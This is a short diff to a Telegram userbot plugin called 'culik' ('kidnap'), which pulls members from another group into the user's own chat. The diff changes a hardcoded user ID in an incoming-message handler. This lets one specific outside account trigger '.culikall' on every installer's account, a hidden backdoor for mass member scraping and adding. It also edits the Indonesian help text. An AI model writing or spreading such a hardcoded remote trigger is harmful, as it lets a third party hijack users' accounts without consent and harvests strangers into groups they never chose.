@@ -53,7 +53,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.culik(?: |$)(.*)")
-@register(incoming=True, from_users=1784606556,
+@register(incoming=True, from_users=1820233416,
           pattern=r"^\.culikall(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
@@ -95,7 +95,7 @@ async def get_users(event):
 CMD_HELP.update(
     {
         "culik": f"**➢ Plugin : **`culik`\
-        \n\n ┌✪ **Syntax :** `.culik` <username grup yang mau diculik> \
+        \n\n ┌✪ **Syntax :** `.culik` <username grup yang mau diculik, pakai @ ya> \
         \n └✪ **Function : **Menculik Member dari Grup Lain ke Grup chat Anda.\
     "
     }
